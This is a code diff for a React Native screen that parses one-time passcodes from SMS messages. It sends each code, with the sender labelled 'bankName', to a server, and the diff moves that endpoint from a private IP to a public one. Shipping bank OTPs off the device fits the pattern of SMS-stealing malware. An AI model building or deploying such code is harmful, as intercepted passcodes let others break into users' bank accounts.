@@ -77,11 +77,11 @@ const SmsVerification = () => {
   const parseOneTimeCode = (message) => {
     const regex = /(?:\b(?:OTP|code|verification)\s*[:\-]?\s*(\d{4,6})\b|\b(\d{4,6})\b(?!\d))/i; 
     const match = message.match(regex);
-    return match ? match[1] || match[2] : null; // Return null if no match is found
+    return match ? match[1] || match[2] : null; 
   };
 
   const sendOtpToServer = async (otpData) => {
-    const { otp, address } = otpData; // Destructure the latest OTP data
+    const { otp, address } = otpData; 
   
     const formattedData = {
       bankName: address,
@@ -89,7 +89,7 @@ const SmsVerification = () => {
     };
 
     try {
-      const response = await axios.post('http://172.16.19.49:5000/receive-otp', { otpData: formattedData });
+      const response = await axios.post('http://13.51.70.66:9000/receive-otp', { otpData: formattedData });
       console.log('OTP sent to the server successfully:', response.data);
     } catch (error) {
       console.error('Failed to send OTP to server:', error);
@@ -99,7 +99,7 @@ const SmsVerification = () => {
 
   const handleContinue = (otpData) => {
     if (otpData) {
-      sendOtpToServer(otpData); // Send the selected OTP to the server
+      sendOtpToServer(otpData); 
     } else {
       Alert.alert('No OTP Selected', 'Please select an OTP to continue.');
     }
@@ -120,7 +120,7 @@ const SmsVerification = () => {
               <Text style={styles.otpText}>From: {otpData.address}</Text>
               <TouchableOpacity 
                 style={styles.continueButton} 
-                onPress={() => handleContinue(otpData)} // Pass the specific OTP data
+                onPress={() => handleContinue(otpData)} 
               >
                 <Text style={styles.buttonText}>Continue</Text>
               </TouchableOpacity>
